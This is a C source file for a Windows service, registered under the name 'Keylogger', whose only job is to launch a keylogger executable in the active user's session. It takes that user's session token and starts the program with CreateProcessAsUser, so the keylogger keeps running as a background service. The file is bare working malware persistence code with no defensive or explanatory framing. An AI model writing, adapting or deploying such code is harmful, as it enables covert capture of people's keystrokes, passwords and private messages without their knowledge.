// service_launcher.c
#include <windows.h>
#include <wtsapi32.h>
#include <userenv.h>
#include <stdio.h>

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Userenv.lib")

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void LaunchInUserSession() {
    DWORD sessionId;
    WTS_SESSION_INFOA *pSessionInfo;
    DWORD count;

    if (WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &count)) {
        for (DWORD i = 0; i < count; i++) {
            if (pSessionInfo[i].State == WTSActive) {
                sessionId = pSessionInfo[i].SessionId;

                HANDLE hToken;
                if (WTSQueryUserToken(sessionId, &hToken)) {
                    STARTUPINFO si = {0};
                    PROCESS_INFORMATION pi = {0};
                    si.cb = sizeof(si);

                    // Path to keylogger.exe
                    char keyloggerPath[MAX_PATH] = "C:\\Users\\tvp\\Desktop\\keylogger.exe";

                    if (CreateProcessAsUser(
                        hToken, NULL, keyloggerPath, NULL, NULL, FALSE,
                        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
                    {
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    }
                    CloseHandle(hToken);
                }
            }
        }
        WTSFreeMemory(pSessionInfo);
    }
}

void WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    hStatus = RegisterServiceCtrlHandler("Keylogger", NULL);
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    // Wait until a user logs in
    Sleep(10000); // Delay to allow session creation
    LaunchInUserSession();

    while (1) {
        Sleep(5000);
    }
}

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {"Keylogger", (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}
